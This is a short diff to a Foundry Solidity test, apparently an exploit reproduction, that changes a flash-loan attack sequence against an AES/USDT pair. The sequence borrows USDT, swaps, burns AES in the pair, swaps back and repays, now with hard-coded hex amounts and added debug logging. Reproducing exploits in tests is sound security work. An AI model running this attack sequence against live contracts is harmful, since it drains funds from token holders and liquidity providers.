@@ -199,21 +199,24 @@ contract AESTest is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_usdt_owner(100000e18);
+        borrow_usdt_owner(0x2089c33dbe52a6000000);
         printBalance("After step0 ");
+        emit log_named_uint("A", pair.getAmountOut(usdt.balanceOf(attacker), address(usdt)));
         swap_pair_attacker_usdt_aes(
-            usdt.balanceOf(attacker),
-            pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
+            0x2089bac938c4ae000000,
+            0x251cb496680f640000000
         );
         printBalance("After step1 ");
-        burn_aes_pair(0);
+        burn_aes_pair(0xde0b6b3a7640000);
         printBalance("After step2 ");
+        emit log_named_uint("A", aes.balanceOf(attacker));
+        emit log_named_uint("A", pair.getAmountOut(0xde0b6b3a7640000, address(aes)) * 9 / 10);
         swap_pair_attacker_aes_usdt(
-            aes.balanceOf(attacker),
-            pair.getAmountOut(aes.balanceOf(attacker), address(aes))
+            0xde0b6b3a7640000,
+            0x24dad4d0ee39b0000000
         );
         printBalance("After step3 ");
-        payback_usdt_owner((100000e18 * 1003) / 1000);
+        payback_usdt_owner(0x20a2c0e6bfd714000000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
